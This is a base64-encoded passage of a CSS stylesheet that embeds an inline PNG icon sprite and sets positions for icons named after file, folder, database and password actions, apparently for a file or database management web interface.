THp2R1RSbDFMeStzTDlyZkp6NFFtNWVLMFJ1T3Z2WjlyQVV6VXJuNW1jMmJjTFh2VVgrTlA2OEp1VjI2aU5SZm5UVUI4Wi9TNWg4NTkrd2U2MDlNMU5CSTRIeU12TFkvYnMyVVNqVWM0ODgweXlzckpZdTg4bUhNNWk1MzdEeG4xcExOcmVoWlNVbENRbVljWVlqREg0ZkQ1Q29SQit2eCsvMzQ4UUFpa2x4cGdrMFlsTUExUXNIUnMwU3QrWW1qczhBM3pvMkQ3d3U5VHRtbzFWK0JPNjVuNC9HWS9mN3ljU2liU0lSMnNkc20yYllEQklOQm9sRUFnUUNBUUFjRjJYRzhmbUEvRHVrZ29takQ1UUJWUTFPQzA5TU5uZnN5MVN1bzRnWjlCSW5IMlA0RS9yaHAwYXdoRXhpcnNOWXZMeVZmejZvLzltVDJyR2hyT25MVDhXd0hHY0lWcHJDZ3NMT2YvODgrTVRVVUlRaVVTSVJDSTRqc1A2bW5SYzEwVktTVXBLQ2tLSUlTMjhxTWtEcFpSSjBpekxRaW1WL002MjdVTTgwQ2c5M0NoOVUwcldVUmdaQTE4UkNJSFJQblI0RjZwaEpzcElGR2xvMy9jUUlxVkZQRXFwVDllc1dmT2ozcjE3RXd3R3ljbkp3Zk04bGk5ZmpyWlRlRy9aL3VURTBmdkw5b014QlB3d3FFY2FubWpwZ1pONy9PQmRWR1Fab25FZTkzNHlIWXpHMCtWNFlpZEZ1VWN6cUhBVWpVNkVPMkpMbVBYVGltTVR3RWdrUWwxZEhlRndPUGxraFJDNHJrc3NGc054SEJ6SHdmTThwSlRFWWpIa1FYcG1nc0FFWVZKS2ZENWZNaTRoQkQ2Zkx4a21TYURVTTFMelR1d1dxeXBCSzBNd2JRQm9QemxGWnhDcjJZSVdIdUdxYnpDOWI4ZlRLWWZFbzVUNmNVbEp5WmRyTnUyZWtaVWlhWWk0cEtmNGlKRE5kZGRlU1VaR1J0SURMeHFabjd4djZkNEdwTlQ0bTQ4MFJNMHN2SnBYa1BWYmtUcURzNDZkaURJYXBSVWF3OTc2WFJ4WGZESmhMOGFKRDMwcGx0L25CZ0Jpc2RpNnVycTZjYTdyNGpoT2kvckVjUnhjMThYelBEelB3N1p0R2hvYWtGS3VhNDNBQkZsS3FTU0JDUTlNRlBQbUZiMVcrczN3bnNYempWU2VWam9vNUpvN3UvVSsyMVpPSFNKYVRjVHVoMi9ZOCtoQUhtTGZQb1NJdG9qbnFxdXU4bDU4OGNWbmFqSUd6VGoxK0hSV2JhM0ZuNUpLYWlERXZFMHhJSWEveVFYZlhWS0Izd0lORE80ZXdxRHh4ejN2SFdURFBMejlqeVBxOWhETUxzS1JkU2lqS2F2ZWd0RHhlUXloQkExdUk4Tjdua0pZUlAxMS83SFEzZkliVXNMaDhMeGdNRGpPc2l3aWtVaXlDQW9oOER3dmVWVktFUXFGcUs2dVJpazE3MkFDdGRaSjcwc1EydHd6RStFU0xTWkFqOU9XL1dmaS9ZNzNoMlFobmJ0aVZlc0oxNVVqOHE1RWRobFBhaWdWM2ZRQVdvdG4wcVJKOHJkdmJhZGJYajVaZFNtY095S1BPV3VxT0hQWWdUN2c3TldWakI3WWhjelVlS0hkdEt1ZTlCUS9maUFzRzVkbnhIWTlqQXJYRWlvNEdpczRDa2UraWxTU2dxeGVTSzFRUmxOZXY1UGNqRUpXN2ZxS3I3WXVMUEVrSXdEcTYrcy9yS3FxdW5UZ3dJR0R0ZGJFWXJFV0pDYmVCNFB4S2RudDI3ZHYwRnEzbUdOVlNsRlRVME5lWGg3Nzl1MGpGb3NsZjdNc2k2S2lJbnIyN01tMmJkdGFlR0NMaHlEMWU2SFVRaUt5Qy9tblA4SCs2Z2l5ay9ISXBuclZaMXZNV1ZNRmtMemFGZ2dOQ3piV0pzUDN6d3VpVk53RE02eEFPZ1RTU01uUHhnUk9ZTzEvdjlNUXpYYXlYbHo4WisxcEQwZDY5TzkyckQyNjM5a3NMMXZJNTV0bnJmVWtKNVkvaEFjd2I5NjhGU05HakppK2JObXlQdzhlUERqTDcvY25pMjJpcmd1RlFsaVd4Y3FWS3h1VVV0TTl6MHQyWVpvOFl1TGl4WXZmSGpSb1VGcnYzcjFKU1VuQnNpeU1NUlFWRmRIWTJNaTZkZXRZdlhyMVBpa1BWWlczdlRQb1hDMVZ2MTExWFgrM3paeCsxNkFkK3c0ckhpa2xCdkRiY05weDNaaTNyb3J4UXc1NDROK1dWUExEMFhuSno1dDIxZU96d1NwNzUvU1YrYWYrOW5nVG5ZMFY2TVBhVngrdnF3K0dYajc3emtVdDFxQWMrNkJWZVVLdjA3dk4yL3o1S2s5elVvSzg1dGEvZi8rYmhCQjNGQmNYRDA1UFQwK09LeU9SQ0xXMXRaU1ZsVzNRV2s4WFFqelRtZ2U5OHNvcmZiVFdEMml0TDdWdE95c3RMUTBwSlRVMU5UaU9zMDlLK2FwUzZzLzMzMy8vSVoyejBqY0dEalZLNmFPdUxsMzN6OFJ6NzBzYnpiUkwramFOZXhOalg0TlNHcVZOYThubDkyK3MxOWF5NThiZG4rSTZVNFduZ2tZWU81YVcrc3k0cVYvZGQzRGd2ZzlRcWJTdlcweXJRT1ZEdENuUmR1L2UvUVRYZFMrUVVvNVhTZzFwcXR2V2FhM25HV00rRkVLc2FBdmIzSjUrK3VrTUtlVUFLYVVXUXBUY2M4ODluVnRmOGsvR2M5ZnpHNzZTUWczM2xFNFRVaUdrUWttTlVCcXBXczl1WGFQelFXSzBYUXprMDg0MFo1UHRCM1lTYjRpYTI3ODcvb2p0ZU1keDZvVVFTa3BwV25zNWptT2VlT0tKNlVBZkRsMlU5TytPUDJJYktZUlE0WERZUkNLUjVLdSt2dDdVMXRhYWlvb0tJNlUwNWVYbFpzYU1HYTBsNHQ4ZC8wOWIwdVV0eTdKOVBoKzJiU2VIU29raFQySnduWjJkemNTSkUyLzMrLzNjZlBQTmo4SUJUZS9mR2IvcG94UFdoTElHRDdhczVwd2EzTWF0TzVXc093a09tbjZJUnhjOTVvSjFNbEVIanBSU0xtMCtSR28rTm5WZGx5NWR1clJrM3U4ZkJTejcvNERmL09GSWQ4RDVpNE9XWllHSms0ZGxJWjBxS2xiL3htdmVCdnVDV2Rvb3NUOWNQdmZlZ1JldGVxdEZwV3ZiZHZKcDJiYWRIRTRGZzBIcTZ1cVNJNFg4L0h4YXMzOWJ2RFFPMmd1Nis1NUVlVDZ3czdDc1RFTGR6NkQ3eUllREdBTm9NQm93V0haRzRaWVB4djRIMEpMQTVoSzRaVm40Zkw0V254TUphc3YrYmZIQ3NvMzJVRjRRb3cwNnRoTVJxU0M4Zng2QlVCRVlBZHJER0FsSU1vLzVlUkNqZTBFSHpYN3pSRmlXbGV6UmQ5YitMK0JYNzVuUG8zTnVKU09ZVGxvZ3hMV2pmc2VJN0lNbUJTMFQwaktHRndYalJSQ05EV1FlTTVGUTEwSEVLN3lFQnhyQVlQbHpRTmwrNkxqZmhHVlpMWXJHNGRwM2pmZVV4OGkrNTFIY3BSOFJwd29zZFdnZ1llTlB6U2RuMEEwa2lESm90TGNIV1RjSG8rb3hzaDRqR3pBcVRLajRGK0RHSDJTSEJDWXlrVkNMRDhjRG11UG5ySHFmTDlaOFRIMmtGaUVGWTY4Nyt2cUZ6MjllMWpFNmp0Lzc0Vk9VZi9RVWtaMWJDQlIwWjhZb2UrTFVwYnBOZktMMVRmR25FZldpbEZWdkppTWxqYUEvTlI2bmJXRVNRelJodEZFT09ybzJUcFpxeE1nNnRLaU56d3ZKdXFidkc1cW1PRnhvMGlIYW5sUnFSbFFpTVFmUFJiUm56ZkgvV1BvV3E4dm5jT3JKSjFLY2V4UmZyUDg3MGNDdW0wWk5MUW92blZGK2QwZjR2UjgrUmNQU3R4bCs2ZldrOUQyVzJOcFpwQzZZUGZtejlJMmJ6cGtyLzlKV0dvWStsRVZlZWlZWEQ1MUkxS3NqTlpqRnMxLzlFci9OQWZJQVhEQmFva1ZsM05OVVBVYldOYjJ2YmZLOGhpU0J4a2lJVHdkMTNKbHNuaEhidHJIdHcrdC9HbU40Zi9GckREOW1HTXBXRENzNkMyVUpSaDgzQnVDV3p1REwvamFkQWFkZVRHanJQS3lYcmlSdDIzdjA3ZDNWeGpZL2JROTdiT0ZvanM3L0hnYndsRUJxUTM1MmIzcm5EbWtaMERQYVFtRmtEVVpXWTBSVi9DcXJNYksyaWN3NmpHekVxQ2lnU2FnQmJiS1JxSE1TbFhmelYyZXNPWDUvWFRrQks0TUxCOFVYMmQ5OXhqUDB6eDhLRU9vTTNpc3ZJMVRZRjI3N0FQNVlBL2R0d3g4cHdhZXRQdTNoWDV2NEtmbVp2VmhYL2pVRldiMVp1MmNKZVJtOXVmV002VFR2TXh0UDE4bG9kWU1JQjdXTVppTGRQSlJYakZiOTBlcFlETWRqN0pQQU53N0xmd2JLY1RDZTlxQVRyWEFiMXFteW5NQTNSdXRadjNjUmEvWXVaTnBaTC9ESFdUOGg1RXVCZzN2NGJlRDkrVVZFVjM5TStnZTM0TWIyRVFVYUczd29INjB1NzBpWWJkdjg4dHhIbWZ6R2oxaTBmUTdaS1ZuY01QWS9BTFJwbGdQanVBOXZlK3FTVVJqT3hDS2ozVXdad0Zyb29jM0xjSUJBclpTSytueStFQjBYYTYyVWlrSUxTYXRkL09YamIrRHp0Uzh6WnVoWVB2em1yd1F0UHd0WGZ3bncxODdnZTE5OEd4cytmNDdpTHFuNGZRRWFLeVhiS3l4dE1ETTZ3Z2Q4QVo2OTZtL2MvUG9QbVg3WmU2Mm0vNWo3MXozV1FaN2J0T1p5Vm1GcmlXL0RKSEZwS0xGS3RFUDgwS3Z5cG9aeS9KZGFGbW5HRUpVeC9mS3FGeXFtZEJiLy9Oa0ZFL05VMVE5VGpWWG9XR1ovbmNlTDF5eFFQLzhYcGYrZnRuK2ZWWmVIYVNVZlhUQVlyWDl2dE1reVd0ODkrSWVmcnY0MjhQL3ZDTnowand2empUWjNHSzF2NmRyL2tod1ZxNkpteCtkaG84MHpSdWxIanJ0eWJydjE1dUhpLzk4UXVQbVRpL3pHbUVsRzY1OW45amg3UU1HZ1M3RzFJbHkrZ2tDS2ovMmw4NmpidlhLbjBmclBSdXRuUjB6Nnl2bFg0QzA0TWozcy93VCtrNHZPUnBzSFVyb01IMXR3ekFSQ1hZNEM0eUZydDdCOTN1L3BPZmhrN0xUZXVKRktLa3BYMGxpNWNabFI2c0h2M2JUc295UEZXM0JrZXRoM2pkLzB5VVV2b1BXa2JnT3VJSlI3SEU1akZmV1ZHMUZlR0JFcEo4VnlLZXcxRUp4YWZCbTlzRU9aTkpSdnBxSjBKZEhhc2pleSt2VjBqZ1FmNzhZY2dSNzJYZU9OMHRjY2ZlWVRpTVlxd3VYejBGNERLZEZLb2czbE5PemF3L0ZYUEU0Z05SMGlPekNSVXF5R3pYVHRQcFRzWEZqMWoyMlhHcVU1RW55Y3dDUFF3NzVydk5FNmFyQ3lncUVVTW5ON0VhdmNRRnFYSEhLNnBKSktGSnlkb0lMZzdJSFlMcUw3bGhMZXNZaFFud2tZcGFOR2E0NEVIeWZ3Q1BTd2J4dS9ZdWQ4SHBsOVYxTFB1M25jYnpnMmxKZkVHNjNqNHlJclNDRDdLQUlwbVRqN1Y2REQrd240d0lwdUJkdmc3WnREWTBNZE1qVUhnaWtZSVRGYUh6Ryt5UVAvZVQzczI4WkhxejVwb2VkRjlqeU95dTJaeEJ1bDQ5VW1LaTR6K2RNSjVZOUFCbE1KT2RYb2ZiT3BGNDNJVUFZcUpSTWQ5VUFhdENjeFNoMHh2b25BanZXd3VWdHErWEtIb2o0V1E4ZzdHV0dyQXg3VUNmeStlZCt3Nzh1TlJQZldFTWlmUzJvUFg3dDRMZUlxU01BMEVQVkNTVDNQYjFXRGNURk5lcHhKVENRWkJWcUFqb0p4OFdmMElMUHdhT3ByVmlEc0VOcVZhRWVpb2dJdE5VRWg0dVIxRXI5Z1R3cUxxMUpwY0J3OHA1NVRhdGR5akVwNFlBZDYyR2NsdFh6alpITHFLU2NrOWJ5djF1MzFqNXBhOU1qU0dlVjNkNFN2bUxlUjhHYkppQ3QrbnRUek5peWM3WjkxUnZtdFozOHVuMmdMLzcwWGYwMjM5RXd1R1haRFVzOTdjYnZCditzMnBqVHBjVWJya0IwSUFLa2dxMEc3b0IxUUxvUzZJdzBZVjZGakNoa1J5S2hIcUdBRXRvbGpqZFowaEorN004aW1RRmZHanp1US8xbnJGbEJTNTJURU8xNGQ2R0VmYmFoclg4L3JBTDlyem1vR2pMK3NoWjdYcDFkWGpHWHViZzgvdUVzK0F3dEd0OVR6Y282aVYzYnZwQlJnbEo2L2JmNWp4R3AzUWtwMzhLV0I4dUlORHhvak5NcnhrRkVQWDdBWDJRTXZRNnRVU2xjc3htaTlwRFA0ejNhS1Z2UC9WVVRFQjk4ZDZXSDdHNnJiMWZNNndvc3FwMTA5cnkzODgyZmNRcTZxYktIbmRYRjNNT1dFbTlDdThnQzBVdWMzN2xwNFk4bW45NWVXTFhzWlJSQXlCMElnRlF3b1Y2QmxPcGw5SmhETUhjS3VOU3ZZdnVhOW5VNUR5VzFHNmZNNmc2OXNiRDMveXREVWtuV2doelUwMUliYTAvTTYxTk5TZmFIMjlMejI4TmNZdzYrakpjRkZLbWI3OTZ6Vlo5cTl2UjFicGliMXVPSFhMdkNBWjFjK00vS0RxcEpQN3FoYy8vRXQzWWRkbk5OOStQZXhVb3BKSzR4aHBLRjh3M3FxZHk0S0c2MmZNVm8vTXU1WDI1dkd0RHZvQ044WWZyeE5QYk5UWStGUlU0dCtYOXczKy80eFE4ZHlWT0VJdHV6N21rVnJGN0o3ZS8xL3RUV24wZHdXWE43OU44SE05UHQ3ZHBWK3Y3MmJ4a3JKamdxZkZvNTU0TnpaNmc4ZDRRRjYvNEwzeTM3UFJSMkZXL2I0OE1GRzZWOFlyYS9xZityMXhQYnZZTy9HTmNqWTdyOFpiUjQ4NVlHdDdhb3lyZUZuZnZVNUczSWtyZVcvMDJMQ3FLbEZEeE92OHpLQU1QRFhwVFBLZjk0KzZvQXR2THpudEVqTjNwdDl5dXFqZkdhM2dTYzdTOTQvWTR2K1BQaHNvL1Y5YUIwMFdqODA5aGVsSHgwSi91NjlrVk5vSmY5dEVuaWtlbHA3dHU3WjJ4N1dXdDJsbEF5UG1QSk1sNDRSLzNmdGtEbVJOdlN3QmV2ZU9yTlRlbHA3dHVINU83ZG9yUVlFOHdyWnZtTTl1WGJ3MnowVzduL0JraDU0cEhyYXIzLzlhNVBZcXRCc0d4VktLYTRiWXJEUkJMc1ZrdEYzQUZwcDFzNTdqeXh0VlkyNTYvVThBTDM5SDBZMlZtR01oNUVDb3dSR2VoanBZcFFMd2tGSko3NGJTVGprVEhpbFJlbjVydkIraU90aHBnMDliTi9xbCtnNStHUUsrNDZtUzM3L1hoV2xLeDl2ck56NDQ1WFBqRXpxYVJEZnBsQmNIRCs0cmZtVUpJQXg2K2h5d3NtQWhSdXVSZ2tYWXpSQ0hIQkFveVNCSVZjYzhvU05hWHJLaWV3YXFIMzd5a1BEZlVkNC84RjZXclN1aXZJdEN3L29ZUmxGYUFMb212VUVNM3JSZThTNU5KVDNHMWxSdXZMRDVUT09mK1BFcWF1dVRCQUlNTS81alBHcDUyQmJCOWF6S0tYUVN1RTE3a05KRDdBeFdpR0VtMHlJVzdlSFZHTXd1bWxmaHdYR2FNQnFHcXMyUFJRN0JTTU83UDM0cnZIK0k5WFRnQ1NCbG1WUjVWYnlEL2Z2WEpBN29kbTJVUSt0QkVwNmFPbkZFNlUxbm5lZ0ZqQlNvcjE5eU1hbG9GMk04ZUpYN1lGMk1OckI2QmpCYnBlZ1JmUVFBcjRydlA5STliUUxuampUYUtWWkk1ZXdxbllSZlhyMFFVckZlN3ZlWkVLUHVLc3I2Y1VUS0x5NEI1bzRnVkkwSTFDNWdNUm9wMG4vY3c1S3ZJUFJVVEFTNHgzcVFkOFYzdDlaUGV6bnk5NmgxblY1c0U5QkN6MU1TY1ZscDA5QWFCVS8ycTVwZS94eVp5VnZiSHVGSy90ZmkyanlQQ1ZjakhRb3lOdFBxWkY0M29FaUxNUFY4U0xUNHNuSDBOcHB5a1FNZEN5ZVNSazVoSUR2Q3UvdnJCN21TRUZ4dDBIY3NXa1ZqeGIxVHVwaFVpczhLYWh4YXZDYURnb0RpMEdEajJHVnM1cFBkM3hNbnpSUVVxSThsOHowV25KenFnbjRZalEyODBDdEhKd3RDNUJ1YWROZ1hxS2NCa0s5OCtOUFhqc1lGUU9qVzYzRHZpdTh2eTA5N0o1bGI0TVJlRnJnU1VsUmx3UDdoWCt5YlNtdmRodUxVUnFKd2xVZVFUc0ZDeDgyUHFTV3JGaTVpb1k5WWE0NzdnckVycmZSMGtVSmw3b2FIMXAydy9YMnRXaEVWS3dhMmJDSGpPRlhBeHJ0bGRINDladngxVkFtaWxGTzNBT01STFZDUUVmNEw3WTZ6Qy9UMU1lbTQwVjdjTjYwOUY5KzhzZTF2K3Nzdm1KK0tSWHpTNGp1ZlFzN3plS3pzM3pUenBtdC91aHZTMCtUMm10M3YvQUZDLzdBbjNXUGtGU1NOejk4R3lrVVNpcUtpM3NndGFKK2R5TTNESjBjWDEzbHVXZ3AwTUpGQ1VHMTZ3ZXRFZUxBcml2TEdNVCt0ZFRPV1VqV21Cdmo2eEdOYUVaZUZMU0xOcXBWRDJvUC85bW1SdGE1R1MzMHpDWHJGanc0YW1wUmw4Ull2ajE4eGZ4U0lwdEZTejF6d2V6Zno5SWJ3M1piZXBnanZlUis0ZTNWbTlsYXVZRzZXRFZsTlZzWjN2TVVCaFIranh1OXJjSDV2MXBxZmZYYkZkYWc4bUhjZXV4ZDFPOEpVNzJ6amh1SFRVa3VoNVBDaWRlQlVxQmtFNWxhSStVQkFvMkJ6SkVURVhXVjFNMS90Q254VHBJOG94Mk1jUUVWNzh3ZVpPM2hQOTVZMitINnhQYnd1K2Q4ellEeGw3YlVNM3QzdFkxbDdyYmIwc01jNlNUM0N4ZG05YVlvdXg4Qlh5cDVtVDFZdGVzcjFteGR2UDk4bmRNMWtZREVHUWRHR1NZUHY2WEZla0pQdUhIeWhJc1dIbHA0R05PU1FLU0Q1Yk5KUC81NmpNeWhjZEVIK0VMRENCWCtoR0QzVzBqcGNRY3B4VDhGTkVhNkhHTHQ0RHZTTXp2Q3Q2ZG4rdHZTMDJMSzVhVWwvMGxpdjNDL3JvTko3QmYrY3ZQc2txZzB3eDU1cURiSlFJTEE2NGJkMUdJaHBtVlpDQkgzdXJRdVBkRlNJTjBvbUgyb1pyc2dqWFNvL2ZReGpIUXdJb1lYK3dhMkxpSzYvRldNZE1CejBkcUpENjNrb2V1MDI4TTNOSGdkcms5c0QyK24wdWI2eEVQVW1MYjB0S21SQmQ2UVh1T0RCKzhYZnZycHAwMUpTUW03ZHUxcU1mNXRmcjJpM3c3U016TkpDYVVUREtVUkNLYlFHSzVqNTZaVlZUOTlNNXgzY0JyKzFmWnQ2cGx0eWxrSDYyRS9ka3BmNk14KzRkWnM1dlU5ODVXUy9aUVNnNVdTQTdWV3hiWS9lSVVTYnQxUDN3eDM3VGlHSTdkdlM4KzBSazZkY3lmUUZ4Z0w5SXZmd01SbHJxYVM0ck10Yk52Q0dJM1cxUFJnaS9ZQUFBaGJTVVJCVkFVRGxNWmM4ZkR5SjcvZjZVTmcvNythSHpoMjVyMWpiZ0NMZ1QxU01JRFJCazhhUEtIeDJSYXBLVGFXQmVHWUp1eW9uRzNsNGVFdmZiYjFhYVo4bkRWbFRHUlV6K0tpNi95QmdOOW9rRnJGejRtV0VrOUtQQzkrOExYcml2alZFM2llSU9ZNHNyWnEvOTB6SHZudElkc1Viam14MnkvN2Q5WDMrWHc2elZPR1JzK09icXYzUC9iYXlzcE8vWXZEa2VMM2ZEQndWMVlrWEd3RkxKQ2dYRU4xZXNhK2ZwZHVLbXFOd0hFWWVHOTVBeis3T0E4dzNQNzRjdjUwOC9mQXNnajQ0OTduQ2sxTWFLUUdoZTJmZUU3LzNOKzgyUEJreitLc1lPRmpENUY5N1VvbStRYnl4TEd2ZEpoQXk0S2NyQXovUTlPZlArUlBBVzcrWHU3UGhoU3BCd05wRmhvYm56QW9XNmZsUy9mKzg0ZDJsUit2cmY2UDl1SStVdnllajQvWm5tTTFGcFBkVkx0SjhQa3NjblcwY01mZmp5bnJjM0ZKNzRNSkxEU0ExZ1loRHl4ZEY5b1E4TVVKMU5vUTh6UkNHakNHZWQ4MGN0N3hXY1JjR2ZUN2cvUzY5WFlDZzBxNXkrcEZqci85UmU0SlMwOExJYVE0WkUzejhFTDFjQ2pOUjJXRFFsa0FOdG9PNHZjcHVnVGtuVUM3QkJ3cFBpY1E2WU8wTUdHU0s2Nk5CVVFOL29wd3I0UEQrNEUwcWVPTGZtSmUwMGJscG5WNkFiK05oWVVqTkRIWG9JMUJHOURHc0xmYUFXTVFTakwrWi9lMXVwOGtzYzh0c2RldCtXZmJ0dWw3M05oRE1sRFhxQmp4ZzlzNHEwOFd1L2VVODkrdnZvcmY3OGYxWjVJV3FrMTdlZG9Gd1d2LytHR2JCMUFjS1Y3djFtekpQSWY4ekdOSXlmNEllOU0ycklDRjhsc0VValJ6bmhpYmMrYXRDK3VhRVdqOHloaU1BYmVwZi9YQXBPRUUvRForRzRReVJGMk4xQnF0d1dBd1dpT2t3cGo0NmlhZnowZFZWVlVMa2xvanJQbm52THc4c3JOekRzbEF0ejVkYTA2OTVNZTUzdGE1OVBUN3VYN0tMV1JscEpFOStFdytlL2hIMFdPUDZkbFczdjhsK0ZsZis4S24zM0oxaG03WWk1QVQ4UTk3SFV3Qndld0xXUEhpTkNkL3dOQW9MRXlHOXdOb0JSakRneTkrSGMra2xmQStrTm9nWlVLeGlWdE9UaTVDK3NERWYwdlkzLzcyTnpadDJzUXZmL25MZGhPWk1OSEtIeXJFVkhwSmJPZktNVEtsRzEzU0pWM3l1aE9XUHFqWlRLT1hWanAwMGwvYlBmN2tTUEZsNGF3TnByRmlwUEtGeUVyeEF6Y1Fsajc4OVpMU3Zaa2J6dmhkUzd5TmlXL2IwVnFSWDlDRHZJTHVkTXN2SXJ0TEFWbGQ4c25KTFNDM1d3RzVYZlBKeWMwaks2Y3JXSFo4UHNQRU84dUpNL2N1di94eVJvNGN5Y1VYWDB3Z0VDQVlEQ1ovYS83eSsvMEVBZ0U4MFRJdkJlZS81bis4YlB5MnoxNzVMN0tveC9LSHNQd3BaUGc4NXIzK0NJK1hucndqNzZ5WmJXNFBPMUw4bmErOWxEYTdTNSswdDk4NkZQL2h1Ly9GdTZHZXdSdWVuTm1pMlBnQmxHcGErMGhjbFlpL0lWNWtteFpGeGk4R3k1aW1DYUY0djlBVE1ubFk0aHR2dk1IWFgzL05yRm16a2lmaXRsVVArbncraEh0Z1RKdjMvZGVEVXFuclloay92T2E0ZS8vRSswOWZoVW5PUmxoMHYrNExhdGN1LzZHUzIyL3FldnBUejFiUG5keENsejlTL0IydnZaUlZYVlB5WktEcmxpSEQ3dnhQbm56aXIzU0p4bHVSMmpUTnNiZmZROHF6RHd5SlJFcGV1UDJsWjI3OHk4U2JxcElFU2hWZmUweWNLcXo0akVyOG1EaXQ0L1dlTVdpdE1EcSsrTkVWQm94R1NKbjB0b2tUSjJKWkZvRkFJRWtVY0VnZENPRDMrMXVJQ1k2MHI4b045bnp5azZlT1p4V3ByTHJ5ZldJUjhHSWdvOUMzRXQ2YVBwb3I3MHFaWGhYWjVHV2Y5dVN6OVY5TWtaM0ZGNjEvang5ZDhnSGhXTzMwK2tqancvVW5Ebi9vMDRkWC94Ymc5bGRmdFU4NU9mMkI5eithZTlXMGFkT29hOWhHemdYRGlNWml1SzZINjdwc0sxL0dyYmZlemxOUFBYdngzcjJCOEswdnpyenhpVWszT240dzhiT2hEUHpxeXM3OW45UzlNOWNqcFVsNllLSllObTlBbW50Y2E1OTlQaCt5NmZTMFl5YzhmM0dSVmZiQ3pmZE1ZSDYxai9WUmczQkFlaUFjRURGWXQ5L2dSVlA1eWFTVG1QLzZnaWNycE0rcGh4YzdnL2Z0ZjVQVW5GbU1QU1c1WHptMFpOMkMzNHlhV3BTOWRFYjUzZHJkOGZzdjVuOTV6dzkrY0Q2N2R1Mml1cnE2eGJGOXJ1dFNXMXVENnpxY05Ib1VwWnMzWHVNMDZEQXd4VzliRmlyUnVocVl2dWlHZHNtNy9hU1pLQ1h4bXZxRW9xa0lKN3p1WUJJVEh0ajhOSTNFYjRuajUxNFo5S2QzaTBkZHpGc2JQbUZGMFEvd0dRc3REZElENllMbkdvUnJzWFFEbkdyUDVlM0pVVGJQZVh2bVNSL0ZDZXdJYjZwZllmam9zNU42NEp3TmJ6UDZ1REhzS1AzZ0Z1RHU2N2EvK3JQaVVSZnpaRWtKb1ZDOGlteCtjbWJpOE1nTkd6YVFtWm5CUTcxR3NIbk8yemM4QzFQODhick9KT2VOeHhUL3VFTVAxRXFqUkh6aHVOZDBwR2JpNE5hMlBLNjV4SldvQTEwWko5Qm5XYlkvSlkyRlM2b1ljbG1VamZWcEdCbWZtcEFlMkNrMnRnVW5GcmdzK2ZzK2Jqc3VnTTluSlplbGRJUnZiSXp2Vno1dlVQenc5YnZQZUlZUHYva3I4RUdvT1g3djdyME1IVHFVcXFycXBwTXpCYUtwaElGTjkrNjlXTHRtSFhhWEEvZjNHOU5VaEp2cXdFVzcyeCtLbmRCelhQenBxSGk5R0E1SHduNi9QeU0vUDc5VnN0b2kwYklzWE5keEFPeWp6cnh2K3hldlBKZ3Fmc0w3cnkzekQ3bnkxQlo3MEJLTndUdVBmY1o1UFRaRXQ4Ly95Sjk2N0JsL2dnMTBCbCt5dHYzOXlnazhBM3I2Rnl4WXdQSEhIOTlxM3BjdVhRVGFadnY4dDczRS9hMFRiNW0xZmRvMUkvcGdET2VQYlB2WTgrYjJ1eGVXb2JUaDB5VTdhc1lWYnZsTlptYjJqV0JuZUVvaXBZci9LNktVU0NHUUtuNTZwUktpNlF4NmdZNFhqN0FUQzk4MjU2TzM1d0ZzZjJOS3hndHJld1JmM2pEc0lWTlgvWDFmSUMwWHl3NmlEVVpKcWFVVER1UjJYZjJEM3F1dS91bkpGZEhlbHo4WmJwNm05dkRwWGQvbjZCTlgrTnZUQTdlL01TVmpmcmVqQy8reGV1UDcycFFPVnJvZVkwUlQ0MmtCNmFEeWE4NC8vcFJUem8xczNabTR2elh5bGxtUEdtT09Cak1HWTNJZ2ZtUVNSamZOa3g2NEpscm11TGVhQml4NzNkY3ZYTkh1djJQOVg3RWoxUVBic3Y4QjV3UVY3T3I2OVdNQUFBQUFTVVZPUks1Q1lJST0nKTsKICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgIGJhY2tncm91bmQtY29sb3I6ICMzMzM7CiAgICBib3JkZXI6IDJweCBzb2xpZCAjMzMzOwogICAgLW1vei1ib3JkZXItcmFkaXVzOiAycHg7Cn0KCi5pY29uOmhvdmVyIHsKCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjNjY2OwogICAgYm9yZGVyOiAycHggc29saWQgIzY2NjsKfQoKLmljb24uYXJyb3dfZG93bnsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IDBweCAwcHg7Cn0KLmljb24uYXJyb3dfbGVmdHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC0xNnB4IDBweDsKfQouaWNvbi5hcnJvd19yZWZyZXNoewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTMycHggMHB4Owp9Ci5pY29uLmFycm93X3JpZ2h0ewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTQ4cHggMHB4Owp9Ci5pY29uLmFycm93X3VwewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTY0cHggMHB4Owp9Ci5pY29uLmNoYW5nZV9wYXNzd29yZHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IDBweCAtMTZweDsKfQouaWNvbi5jbGVhbnVwewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTE2cHggLTE2cHg7Cn0KLmljb24uZGF0YWJhc2V7CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtMzJweCAtMTZweDsKfQouaWNvbi5kYXRhYmFzZV9zcWx7CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtNDhweCAtMTZweDsKfQouaWNvbi5kYXRhYmFzZV90YWJsZXsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC02NHB4IC0xNnB4Owp9Ci5pY29uLmZpbGV7CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAwcHggLTMycHg7Cn0KLmljb24uZmlsZV9hZGR7CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtMTZweCAtMzJweDsKfQouaWNvbi5maWxlX2RlbGV0ZXsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC0zMnB4IC0zMnB4Owp9Ci5pY29uLmZpbGVfZG93bnsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC00OHB4IC0zMnB4Owp9Ci5pY29uLmZpbGVfZm9sZGVyewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTY0cHggLTMycHg7Cn0KLmljb24uZmlsZV9mb2xkZXJfYWRkewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMHB4IC00OHB4Owp9Ci5pY29uLmZpbGVfZm9sZGVyX2RlbGV0ZXsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC0xNnB4IC00OHB4Owp9Ci5pY29uLmZpbGVfZm9sZGVyX2Rvd257CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtMzJweCAtNDhweDsKfQouaWNvbi5maWxlX3ppcHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC00OHB4